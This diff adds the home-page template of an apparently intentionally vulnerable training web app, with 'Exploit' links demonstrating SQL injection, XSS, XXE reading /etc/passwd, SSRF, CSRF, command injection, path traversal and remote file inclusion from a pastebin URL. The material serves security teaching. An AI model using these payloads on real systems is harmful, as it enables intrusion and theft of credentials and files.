@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+
+{% extends "base.html" %}
+
+{% block title %}Home{% endblock %}
+
+{% block content %}
+<div class="features">
+    <script>
+        function leaveComment() {
+            // Prompt the user for a comment
+            const userComment = prompt('Please leave a comment');
+
+            if (userComment !== null) {
+                // Encode the comment and redirect with it as a parameter
+                const encodedComment = encodeURIComponent(userComment);
+                window.location.href = `/?comment=${encodedComment}`;
+            }
+        }
+    </script>
+    <h2>Available Vulnerabilities:</h2>
+    <ul>
+        <li>Login Bypass - 
+            <a href="{{url_for('login')}}?username=admin&password={{ "' OR '1' LIKE '1" | urlencode }}">Exploit</a>
+        </li>
+
+        <li>UNION SQL Injection - 
+            <a href="{{url_for('index')}}?id={{ '2 UNION ALL SELECT NULL, NULL, NULL, (SELECT id || \',\' || username || \',\' || password FROM users WHERE username = \'admin\')' | urlencode }}">
+                Exploit
+            </a>
+        </li>
+
+        <li>Blind SQL Injection(time-based) - 
+            <a href="?id=(SELECT(CASE WHEN(SUBSTR((SELECT password FROM users WHERE name='admin'),2,1)='2')THEN(LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(300000000)))))ELSE 0 END))" > Exploit</a>
+        </li>
+
+        <li>XSS(reflected) - 
+            <a href="{{url_for('index')}}?v=0.2<script>alert('Injected JavaScript')</script>"> Exploit </a>
+        </li>
+
+        <li>XSS(stored) - 
+            <a href="#" onclick="leaveComment(); return false")>Vulnerability</a>
+                <a href="/?comment=<script>alert('Stored - Injected JavaScript')</script>'">Exploit
+                </a>
+        </li>
+
+        <li>XSS(DOM-based) - 
+            <a href="/?foobar#lang=en<script>alert('DOM injected JavaScript')</script>">Exploit </a>
+        </li>
+
+        <li>XXE(local) - 
+            <a href="?xml=<!DOCTYPE example [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>%26xxe;</root>"> Exploit</a>
+        </li>
+
+        <li>SSRF - 
+            <a href="?path=http%3A%2F%2F127.0.0.1%3A8989"> Exploit</a>
+        </li>
+
+        <li>CSRF - 
+            <a href="/?comment=">Vulnerability</a>
+            <a href="?v=<img
+ src='/?comment=%3Cdiv%20style%3D%22color%3Ared%3B%20font-weight%3A%20bold%22%3ECSRF-Attack%3C%2Fdiv%3E'>
+ Go back to <a href='/?comment='>CSRF - Vulnerability</a> to see the change">Exploit </a>
+        </li>
+
+        <li>Redirection - 
+            <a href="?redir=https://en.wikipedia.org/wiki/URL_redirection">Exploit</a>
+        </li>
+
+        <li>OS Command Injection - 
+            <a href="?domain=www.google.com%3B%20ifconfig">Exploit</a>
+        </li>
+
+        <li>Path Traversal(absolute path) - 
+            <a href="{{url_for('index', path='/etc/passwd')}}">Exploit
+                on Unix-like
+            </a> - 
+            <a href="{{url_for('index', path='C:\\Windows\\System32\\drivers\\etc\\hosts') }}">Exploit on
+                Windows
+            </a>
+        </li>
+
+        <li>Path Traversal(relative path) - 
+            <a href="/?path=../../../../../../../etc/passwd">Exploit</a>
+        </li>
+
+        <li>File Inclusion - 
+            <a href="?include=http://pastebin.com/raw.php?i=6VyyNNhc&cmd=ifconfig">Exploit</a>
+        </li>
+
+        <li>Path Disclosure via Error Message - 
+            <a href="/?path=foobar">Exploit</a>
+        </li>
+    </ul>
+</div>
+{% endblock %}
